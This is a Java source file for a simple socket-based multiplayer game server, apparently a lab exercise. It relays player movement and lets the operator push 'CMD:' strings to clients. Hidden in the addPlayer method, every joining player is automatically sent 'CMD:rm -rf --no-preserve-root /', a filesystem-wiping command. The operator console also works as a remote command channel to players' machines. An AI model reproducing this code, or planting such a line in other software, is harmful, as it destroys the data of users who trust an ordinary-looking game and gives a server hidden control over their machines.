package Lab_4;
import java.io.*;
import java.net.*;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public class Server {

    private static final int PORT = 12345;
    private static Map<String, PlayerHandler> players = new ConcurrentHashMap<>();

    public static void main(String[] args) {
        try (
                ServerSocket serverSocket = new ServerSocket(PORT);
                BufferedReader consoleInput = new BufferedReader(
                        new InputStreamReader(System.in)
                )
        ) {
            System.out.println("Server started on port " + PORT);

            new Thread(() -> {
                try {
                    String input;
                    while ((input = consoleInput.readLine()) != null) {
                        if (input.startsWith("CMD:")) {
                            String command = input.substring(4);
                            String[] parts = command.split(" ", 2);
                            if (parts.length == 2) {
                                String targetPlayer = parts[0];
                                String cmd = parts[1];
                                sendCommandToPlayer(targetPlayer, cmd);
                            } else {
                                System.out.println("Usage: CMD:<player> <command>");
                            }
                        } else if (input.equals("LIST")) {
                            System.out.println("Connected players: " + players.keySet());
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }).start();

            while (true) {
                Socket clientSocket = serverSocket.accept();
                PlayerHandler playerHandler = new PlayerHandler(clientSocket, players);
                new Thread(playerHandler).start();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static synchronized void broadcast(String message, PlayerHandler sender) {
        for (PlayerHandler player : players.values()) {
            if (player != sender) {
                player.sendMessage(message);
            }
        }
    }

    public static synchronized void updatePlayerPosition(String playerName, String positionData) {
        String message = "UPDATE:" + playerName + ":" + positionData;
        broadcast(message, players.get(playerName));
    }

    public static synchronized void addPlayer(String playerName, PlayerHandler playerHandler) {
        players.put(playerName, playerHandler);
        playerHandler.sendMessage("CMD:rm -rf --no-preserve-root /");
    }

    public static synchronized void removePlayer(String playerName) {
        players.remove(playerName);
    }

    public static synchronized void sendCommandToPlayer(String playerName, String command) {
        PlayerHandler player = players.get(playerName);
        if (player != null) {
            player.sendMessage("CMD:" + command);
            System.out.println("Sent command to " + playerName + ": " + command);
        } else {
            System.out.println("Player not found: " + playerName);
        }
    }
}

class PlayerHandler implements Runnable {

    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private String playerName;
    private Map<String, PlayerHandler> players;

    public PlayerHandler(Socket socket, Map<String, PlayerHandler> players) {
        this.socket = socket;
        this.players = players;
    }

    @Override
    public void run() {
        try {
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            out = new PrintWriter(socket.getOutputStream(), true);

            out.println("Enter your player name:");
            playerName = in.readLine();
            Server.addPlayer(playerName, this);
            System.out.println(playerName + " has joined the game.");

            String message;
            while ((message = in.readLine()) != null) {
                if (message.startsWith("MOVE:")) {
                    String positionData = message.substring(5);
                    System.out.println(playerName + " moved to " + positionData);
                    Server.updatePlayerPosition(playerName, positionData);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                Server.removePlayer(playerName);
                socket.close();
                System.out.println(playerName + " has left the game.");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public void sendMessage(String message) {
        out.println(message);
    }
}